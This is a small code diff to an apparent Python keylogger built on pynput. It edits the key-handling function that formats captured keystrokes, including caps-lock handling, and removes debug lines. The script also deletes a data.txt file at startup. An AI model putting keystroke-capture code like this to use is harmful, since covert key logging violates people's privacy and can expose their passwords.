@@ -2,8 +2,6 @@ from pynput import keyboard
 import os
 from datetime import datetime
 
-foo='a'
-print(str(foo).isalpha())
 
 is_caps_lock=False
 os.remove('./data.txt')
@@ -13,6 +11,7 @@ chars_dict = {
     keyboard.Key.enter: '\n',
     keyboard.Key.tab: '\t'
 }
+
 def remove_quote(txt):
     return str(txt)[1:-1]
 
@@ -30,7 +29,7 @@ def display_keys(_key):
 
     elif remove_quote(_key).isalpha():
         if is_caps_lock:
-            _key = remove_quote(_key).upper()
+            _key = str(_key).upper()
 
         to_write = remove_quote(_key)
 
